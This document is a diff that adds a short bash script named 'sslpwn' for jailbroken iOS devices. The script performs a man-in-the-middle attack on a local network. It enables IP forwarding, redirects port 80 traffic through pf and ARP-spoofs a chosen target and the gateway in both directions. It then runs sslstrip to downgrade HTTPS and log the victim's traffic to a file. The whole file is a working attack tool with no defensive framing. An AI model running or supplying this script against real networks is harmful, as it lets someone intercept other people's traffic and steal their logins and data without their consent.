@@ -1,0 +1,48 @@
+#!/bin/bash
+
+# sslpwn 0.1 for iOS devices
+
+# a script based on arpspoof and sslstrip
+# utilizes the "pf" packet filter in order to
+# redirect TCP port 80 connections to TCP port 10000
+# depends on tools from https://ininjas.com/repo/
+
+# written by patois in 2015
+
+option=$1
+target=$option
+srctcp=80
+dsttcp=10000
+
+if [ $option = "-d" ] ;
+  then
+     sysctl -w net.inet.ip.forwarding=0
+     killall arpspoof
+     kill $(ps -A | grep [s]slstrip | gawk '{print $1}')
+     # disable pf
+     pfctl -d
+     exit 1
+fi
+
+# /etc/pfsslstrip.config
+echo -e "rdr pass on en0 inet proto tcp from any to any port $srctcp -> 127.0.0.1 port $dsttcp\n" > /etc/pfsslstrip.config
+
+# enable pf
+pfctl -evf /etc/pfsslstrip.config
+
+# get default gateway
+gw=`netstat -nr | grep 'default' | gawk '{print $2}'`
+
+echo -e "gateway: $gw"
+
+# enable forwarding
+sysctl -w net.inet.ip.forwarding=1
+
+# spoof
+arpspoof -i en0 -t $target $gw > /dev/null 2>&1 &
+arpspoof -i en0 -t $gw $target > /dev/null 2>&1 &
+
+sslstrip -f -k -a -w /var/mobile/`date +%m-%d-%y-%s`.log &
+
+ps | grep [s]slstrip
+ps | grep [a]rpspoof
